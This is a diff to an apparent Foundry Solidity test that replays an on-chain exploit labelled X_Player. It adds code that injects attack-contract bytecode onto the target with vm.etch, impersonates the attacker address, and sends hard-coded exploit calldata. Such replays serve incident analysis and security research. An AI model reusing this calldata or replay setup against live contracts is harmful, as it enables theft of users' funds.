@@ -7,8 +7,10 @@ contract ReplayTest is X_PlayerBase {
     address constant ATTACKER_ADDR = 0x9dF9A1D108EE9c667070514b9A238B724a86094F;
     address constant TARGET_ADDR = 0x80bd723DC38A07952dB40C1C2A45084714399bD9;
     bytes constant INPUT_DATA = hex"be2684d4000000000000000000000000000000000000000000b5facfe5b81c365c000000000000000000000000000000c2c4ccde8948c693d0b04f8bad461e35a12f20b80000000000000000000000009b0ff36de2fc477cda8e4468e0067322ae18ce70000000000000000000000000b413271b84902c95f01015d58326dda59a74785400000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000009323032362d312d32380000000000000000000000000000000000000000000000";
-
+    address constant USDTs = 0x55d398326f99059fF775485246999027B3197955;
+    
     function testReplay() public {
+        fundingToken = USDTs;
         beneficiary = ATTACKER_ADDR;
         if (fundingToken == address(0)) vm.deal(address(this), 0);
         _logTokenBalance(fundingToken, beneficiary, "[REPLAY] Before");
@@ -33,7 +35,11 @@ contract ReplayTest is X_PlayerBase {
     }
 
     function _executeReplay() external {
-        vm.startPrank(ATTACKER_ADDR);
+        // 공격 컨트랙트 코드 주입
+        bytes memory code = vm.readFileBinary("test/2026-01-28_X_Player/attack.bin");
+
+        vm.startPrank(ATTACKER_ADDR, ATTACKER_ADDR);  // msg.sender + tx.origin
+        vm.etch(TARGET_ADDR, code);
         (bool success, bytes memory returnData) = TARGET_ADDR.call(INPUT_DATA);
         if (!success) {
             if (returnData.length > 0) {
